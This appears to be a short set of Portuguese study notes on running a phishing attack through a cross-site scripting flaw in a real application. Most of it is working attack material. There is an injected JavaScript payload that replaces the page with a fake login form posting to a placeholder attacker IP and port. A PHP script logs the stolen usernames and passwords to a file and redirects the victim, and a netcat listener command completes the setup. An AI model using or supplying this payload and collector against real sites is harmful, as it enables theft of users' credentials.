- Utiliza de uma aplicação verídica que possui XSS.
- Tem como objetivo o roubo de dados, geralmente credenciais.

# Encontrar o XSS

- Procuramos algum local da aplicação com a vulnerabilidade de XSS.
- Identificamos como nosso payload é tratado na página.

# Injetando Conteúdo

- Criamos um formulário de login.

```html
<div>
<h3>Please login to continue</h3>
<input type="text" placeholder="Username">
<input type="text" placeholder="Password">
<input type="submit" value="Login">
<br><br>
</div>
```

- Injetamos o formulário de login na página minificamos o código HTML com uma função que irá enviar informações para um IP e porta especificadas, removemos o resto do conteúdo utilizando funções em JS para executar as ações.

```javascript
document.write('<h3>Please login to continue</h3><form action=http://IP:PORTA><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

- Criamos um servidor HTTP em php para lidar com as requests

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

- Escutamos com o netcat na porta especificada

```bash
sudo nc -lvnp 80
```

